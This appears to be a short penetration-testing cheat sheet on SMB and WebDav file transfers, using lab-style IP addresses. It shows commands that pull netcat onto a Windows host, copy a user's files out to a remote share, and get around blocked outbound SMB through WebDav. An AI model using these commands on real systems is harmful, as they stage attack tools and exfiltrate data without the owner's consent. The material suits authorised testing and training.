# SMB File Transfers

## Impacket SMB Server

```bash
# Basic
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With authentication (for newer Windows that block guest access)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

---

## Windows — Copy from SMB

```cmd
copy \\10.10.10.32\share\nc.exe
```

If "unauthenticated guest access" is blocked, mount with credentials:

```cmd
net use n: \\10.10.10.32\share /user:test test
copy n:\nc.exe
```

## Windows — Copy to SMB (Upload)

```cmd
copy C:\Users\john\Desktop\output.txt \\10.10.14.22\share\output.txt
```

---

## SMB over HTTP (WebDav)

When SMB (TCP/445) is blocked outbound, WebDav works over HTTP/HTTPS. Windows will fall back to HTTP if SMB fails.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

On Windows:

```cmd
dir \\192.168.49.128\DavWWWRoot
copy C:\file.txt \\192.168.49.128\DavWWWRoot\
copy C:\file.txt \\192.168.49.128\sharefolder\
```

`DavWWWRoot` is a special Windows Shell keyword for the WebDav root — no such folder exists on the server.
